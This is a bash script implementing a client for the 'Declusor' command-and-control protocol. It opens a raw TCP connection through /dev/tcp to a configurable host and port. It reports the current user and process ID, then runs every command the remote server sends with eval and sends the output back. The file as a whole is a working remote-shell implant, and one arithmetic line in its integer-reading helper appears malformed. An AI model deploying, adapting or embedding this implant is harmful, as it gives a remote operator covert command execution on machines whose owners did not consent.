#!/bin/bash
# -----------------------------------------------------------------------------
# Declusor Bash Client
# Implements the Declusor C2 Protocol (DCP).
# -----------------------------------------------------------------------------

HOST="${HOST:-127.0.0.1}"
PORT="${PORT:-4444}"

# Constants
MSG_AUTH_HELLO=1
MSG_AUTH_ACK=2
MSG_CMD_EXEC=16   # 0x10
MSG_CMD_STDOUT=17 # 0x11
MSG_CMD_STDERR=18 # 0x12
MSG_CMD_EXIT=19   # 0x13
MSG_HEARTBEAT=32  # 0x20
MSG_TERM=153      # 0x99

# Open Connection
exec 3<>/dev/tcp/"$HOST"/"$PORT" || exit 1

# Helper: Pack integer to 4 bytes (Big Endian)
function pack_int() {
    local val=$1
    
    printf "\\$(printf '%03o' $((val >> 24 & 0xff)))"
    printf "\\$(printf '%03o' $((val >> 16 & 0xff)))"
    printf "\\$(printf '%03o' $((val >> 8 & 0xff)))"
    printf "\\$(printf '%03o' $((val & 0xff)))"
}

# Helper: Send Frame
function send_frame() {
    local type=$1
    local payload=$2
    local len=${#payload}
    
    # Send Length (4 bytes)
    pack_int "$len" >&3
    # Send Type (1 byte)
    printf "\\$(printf '%03o' "$type")" >&3
    # Send Payload
    if [ "$len" -gt 0 ]; then
        printf "%s" "$payload" >&3
    fi
}

# Helper: Read N bytes and convert to integer (Big Endian)
function read_int() {
    local b1 b2 b3 b4
    LANG=C IFS= read -u 3 -r -d '' -n 1 b1
    LANG=C IFS= read -u 3 -r -d '' -n 1 b2
    LANG=C IFS= read -u 3 -r -d '' -n 1 b3
    LANG=C IFS= read -u 3 -r -d '' -n 1 b4
    
    # Convert chars to ascii values
    # Note: This is tricky in pure bash without 'ord'. 
    # We rely on printf %d with a quote.
    local v1=$(printf '%d' "'$b1")
    local v2=$(printf '%d' "'$b2")
    local v3=$(printf '%d' "'$b3")
    local v4=$(printf '%d' "'$b4")
    
    echo `((v1 << 24 | (v2 << 16) | (v3 << 8) | v4)`
}

# Helper: Read 1 byte as integer
function read_byte() {
    local b
    LANG=C IFS= read -u 3 -r -d '' -n 1 b
    printf '%d' "'$b"
}

# Helper: Read N bytes string
function read_n() {
    local n=$1
    local data
    if [ "$n" -gt 0 ]; then
        LANG=C IFS= read -u 3 -r -d '' -n "$n" data
        echo -n "$data"
    fi
}

# --- Handshake ---
USER=$(whoami 2>/dev/null || echo "unknown")
META="user=$USER&os=linux&pid=$$"
send_frame $MSG_AUTH_HELLO "$META"

# Wait for ACK
# Header: 4 bytes len, 1 byte type
LEN=$(read_int)
TYPE=$(read_byte)

if [ "$TYPE" -ne "$MSG_AUTH_ACK" ]; then
    exit 1
fi
# Consume payload if any
read_n "$LEN" >/dev/null

# --- Main Loop ---
while true; do
    # Read Header
    LEN=$(read_int)
    # Check if read failed (EOF)
    if [ -z "$LEN" ]; then break; fi
    
    TYPE=$(read_byte)
    
    # Read Payload
    PAYLOAD=""
    if [ "$LEN" -gt 0 ]; then
        # read -N is preferred for exact byte count if available
        LANG=C IFS= read -u 3 -r -d '' -N "$LEN" PAYLOAD
    fi
    
    case $TYPE in
        $MSG_CMD_EXEC)
            # Execute command
            # We use a subshell to capture output
            # Note: This blocks until command finishes. 
            # For a real C2, async or streaming is better, but this is simple.
            OUTPUT=$(eval "$PAYLOAD" 2>&1)
            RET=$?
            
            if [ -n "$OUTPUT" ]; then
                send_frame $MSG_CMD_STDOUT "$OUTPUT"
            fi
            send_frame $MSG_CMD_EXIT "$RET"
            ;;
            
        $MSG_HEARTBEAT)
            send_frame $MSG_HEARTBEAT ""
            ;;
            
        $MSG_TERM)
            break
            ;;
    esac
done